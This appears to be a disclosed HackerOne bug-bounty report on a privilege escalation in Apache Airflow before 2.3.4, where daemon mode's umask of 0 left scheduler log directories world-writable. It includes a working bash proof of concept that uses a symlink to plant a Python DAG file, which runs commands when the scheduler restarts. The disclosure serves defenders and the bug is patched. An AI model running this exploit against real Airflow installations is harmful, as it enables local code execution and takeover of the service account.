---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1690093'
original_report_id: '1690093'
title: Airflow Daemon Mode Insecure Umask Privilege Escalation
weakness: Incorrect Permission Assignment for Critical Resource
team_handle: ibb
created_at: '2022-09-02T22:36:31.480Z'
disclosed_at: '2022-09-17T12:23:18.068Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
asset_identifier: https://github.com/apache/airflow
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- incorrect-permission-assignment-for-critical-resource
---

# Airflow Daemon Mode Insecure Umask Privilege Escalation

## Metadata

- HackerOne Report ID: 1690093
- Weakness: Incorrect Permission Assignment for Critical Resource
- Program: ibb
- Disclosed At: 2022-09-17T12:23:18.068Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Apache Airflow prior to 2.3.4 had multiple components with an insecure daemon umask of 0, resulting in critical files and directories to be world writable. As such, any local user can infer Airflow to process specially crafted input and ultimately perform a privilege escalation to user executing Airflow. In particular the scheduler component is exploitable.

This is CWE-277: Insecure Inherited Permissions

The vulnerability and fix was announced as https://www.openwall.com/lists/oss-security/2022/09/02/3

# Proof of concept

The following attack works against the demo installation of Apache Airflow (when `airflow scheduler` is run with the `--daemon` flag):
```
#!/bin/bash
TARGET=/home/airflow
umask 0
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
rm example_bash_operator.py.log
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
until [ -f $TARGET/dags/poc.py ]
do
  sleep 1
done
rm example_bash_operator.py.log
(cat <<'EOF'
import os
os.system("id >>/tmp/pwned")
from airflow import DAG
EOF
) > $TARGET/dags/poc.py
```
The injected DAG payload (code execution) is triggered when the Airflow scheduler is restarted. This simple PoC performs a full arbitrary code execution, but other means of gaining control via custom DAGs exist as well.

## Impact

Privilege escalation: loss of confidentiality, integrity and availability

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
